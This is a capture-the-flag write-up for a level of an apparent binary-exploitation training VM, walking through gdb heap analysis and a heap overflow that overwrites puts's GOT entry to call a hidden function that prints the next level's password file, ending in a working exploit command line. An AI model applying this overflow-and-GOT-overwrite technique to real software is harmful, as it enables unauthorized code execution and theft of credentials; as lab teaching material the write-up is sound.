# Write up

Small reminder :
```
scp -P 4242 level7@192.168.56.101:level7 bin7
objdump -M intel -d bin7 > asm7_intel.txt
```

After disassembling, we notice a `m` function printing the content of the `/home/user/level8/.pass` file, we will have to manage to execute it.
This time, we have no way to put a breakpoint further than the fgets call, since we don't have the rights with gdb we will get a segfault before.

We will try some analysis anyway.
Break point before the fgets call :
```
(gdb) break* 0x80485eb
```
Heap addresses are here :
```
0x804a000  0x806b000    0x21000        0x0 [heap]
```
First buffer (stored argv[1]) :
```
(gdb) run AAAA BBBB
(gdb) find 0x804a000, 0x806b000, 0x41414141
0x804a018
warning: Unable to access target memory at 0x806941c, halting search.
1 pattern found.
```
Second buffer (stored argv[2]) :
```
(gdb) find 0x804a000, 0x806b000, 0x42424242
0x804a038
warning: Unable to access target memory at 0x806943c, halting search.
1 pattern found.
```
With further investigation :
```
(gdb) x/120x 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
0x804a040:      0x00000000      0x00020fc1      0xfbad240c      0x00000000
```
We see that the 2 buffers are actually structs and have a 20 bytes offset.
The two buffers are right next to each other, so we can overright the second buffer address after 20 chars.
The second buffer also being a strcpy parameter, we will try to execute the puts function with a m call inside though the GOT exploit (See level5).
(If we execute it directly, the `0x8049960` global will not contains the flag file contents)
```
objdump -R level7

level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049904 R_386_GLOB_DAT    __gmon_start__
 ...
08049928 R_386_JUMP_SLOT   puts
 ...
```
We can now write our payload.
Note that we will need to separate the payload in two parts, the first one which overwrite the second struct address, and the second one which overwrite the second struct content.
```
./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
```
